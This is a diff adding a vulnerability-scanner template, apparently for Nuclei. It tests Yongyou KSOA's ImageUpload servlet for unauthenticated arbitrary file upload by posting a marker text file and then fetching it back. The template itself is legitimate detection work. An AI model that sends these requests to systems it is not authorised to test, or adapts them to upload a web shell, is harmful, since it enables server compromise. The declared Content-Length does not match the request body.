@@ -1,0 +1,38 @@
+id: yongyouKSOA_ImageUpload_upload
+
+info:
+  name: yongyouKSOA_ImageUpload_upload
+  author: sm
+  severity: critical
+  tags: yongyou
+
+http:
+  - raw:
+      - |              
+        POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=helloyongyouKSOA.txt HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 3
+
+        helloyongyouKSOA
+        
+      - |              
+        GET /pictures/helloyongyouKSOA.txt HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 3
+
+        helloyongyouKSOA        
+               
+    matchers:
+      - type: word
+        words:
+          - "hello"
+          - "yongyouKSOA"
+        condition: and
